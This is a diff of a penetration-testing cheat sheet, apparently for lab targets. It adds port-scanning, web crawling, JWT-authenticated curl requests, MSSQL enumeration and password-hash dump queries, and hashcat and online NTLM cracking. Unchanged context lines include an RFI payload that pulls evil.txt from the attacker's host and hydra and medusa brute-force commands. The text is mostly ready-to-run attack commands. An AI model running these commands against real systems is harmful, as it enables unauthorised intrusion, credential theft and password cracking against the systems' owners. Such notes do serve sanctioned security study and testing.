@@ -81,10 +81,10 @@ PORT SCANNING (All ports for both TCP/UDP)
 # As of Mar 19:
 # It has been found to be much faster to use masscan then pass the ports to nmap for service enumeration.
 
-masscan -p1-65535,U:1-65535 $tgt --rate=1000 -e tun0 |tee masscan-all-tcp-and-udp.out
-cat masscan-all-tcp-and-udp.txt | grep tcp| awk '{print $4}'| cut -d / -f1 |sort n > tcp-ports
-cat masscan-all-tcp-and-udp.txt | grep udp| awk '{print $4}'| cut -d / -f1 |sort n > udp-ports
-nmap -v -n --reason -p <TCP Ports> -sT -sC -sV $tgt -oA services-tcp
+masscan -p1-65535,U:1-65535 $tgt --rate=800 --wait 30 -e tun0 |tee masscan-all-tcp-and-udp.out
+cat masscan-all-tcp-and-udp.out | grep tcp| awk '{print $4}'| cut -d / -f1 |sort -n > tcp-ports
+cat masscan-all-tcp-and-udp.out | grep udp| awk '{print $4}'| cut -d / -f1 |sort -n > udp-ports
+nmap -v -n --reason -p <TCP Ports> -O -sT -sC -sV $tgt -oA services-tcp
 nmap -v -n --reason -p <UDP Ports> -sU -sC -sV $tgt -oA services-udp
 
 ----------Always follow up with this--------------
@@ -177,12 +177,33 @@ nmap --script=/usr/share/nmap/scripts/smtp-enum-users.nse
 amap $tgt 80
 nikto -host $tgt -port $tgtPort
 curl -v http://$tgt/webpage
+
 echo -e "HEAD / HTTP/1.1 \r" |nc -nvv $tgt 80
+
+curl -I http://$tgt:3000/
+
+# Start crawling the site for sites:
+dirb http://$tgt/ |tee dirb-$portNum.out
+
+# Now check for files and end points
+dirb http://$tgt/ -X .htm,.html,.php |tee dirb-$portNum-files.out
+
+# Wfuzz of a JWT endpoint 
+
+# Try to auth with JWT with curl
+curl -H 'Accept: application/json' -H "Authorization: Bearer ${TOKEN}" https://{hostname}/api/myresource
+
+curl -H 'Accept: application/json' -H "Authorization: Bearer ${token}" http://$tgt:3000/users/
+
 
 -------------------------------------------
 135 - RPC
 # See what remote clients can interact with
 showmount -e $tgt
+------------------------------------------
+139 - Netbios
+
+
 
 -------------------------------------------
 161 - snmp
@@ -212,9 +233,40 @@ smbclient //TARGET/Backups -I $tgt -N
 mount -t cifs //$tgt ip/Backups /media/ -o username=NULL
 
 -------------------------------------------
-?
+1433 - SQL
+
+	----#MS-SQL-S -----
+nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 $tgt
+
+#To interact with the DB directly.  Default Admin name is SA.
+# Install Impacket: https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
+mssqlclient.py -p 1433 -db DMBNAME -windows-auth USER@10.10.10.10
+
+# http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/
+
+# List all DB
+SELECT name FROM master..sysdatabases;
+
+# See columns for a table
+SELECT * FROM information_schema.columns WHERE table_name='master'
+
+# Determine current DB
+SELECT DB_NAME();
+
+# Dump Admin Users
+select loginname from syslogins where sysadmin = 1
+
+# Dump usernames and hashes
+select name, password_hash FROM master.sys.sql_logins
+
+
 -------------------------------------------
-?
+3000 - JS Query API
+#confirm what it is powered by
+curl -I http://$tgt:3000/
+
+
+
 -------------------------------------------
 
 
@@ -320,6 +372,14 @@ http://$tgt/addguestbook.php?name=badDude&comment=pwnU&LANG=http://$me/evil.txt%
 LFI vs RFI Command Input:
 LFI will execute the CMD found in the command line; enabled by the php 'cmd' variable injected into the logs
 RFI will execute the CMD found in the "evil.txt" found in the evil.txt hosted on the attack machine
+
+===========================================================================================
+JSON / JQUERY Rest API on port 3000...  
+===========================================================================================
+# Find what its powered by.... Probably Express... see if the Response Headers are there as a tab
+curl -I http://$tgt:3000/
+
+
 
 ==========================================================================================
 WORDPRESS
@@ -1283,6 +1343,10 @@ tasklist -v
 ==========================================================================================
 				PASSWORD ATTACKS
 ==========================================================================================
+https://hashkiller.co.uk/Cracker/NTLM
+
+https://crackstation.net/
+
 #A list of usernames, checking for no passwords (n) and users using their usernames as
 #passwords (s) and timing of 1.
 hydra -L usernames.txt -e sn -t 1 ftp://172.17.0.150
@@ -1336,6 +1400,10 @@ john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt
 
 #Caracking HTTP
 medusa -h $tgt -n 9505 -u bethany -P mutated.txt -M http -m DIR:/~Public -T 10
+
+------------------HASHCAT---------------
+hashcat -h |grep -i ntlm
+hashcat -m 5600 thehash.ntlmv2
 
 ==========================================================================================
                 LATERAL MOVEMENT
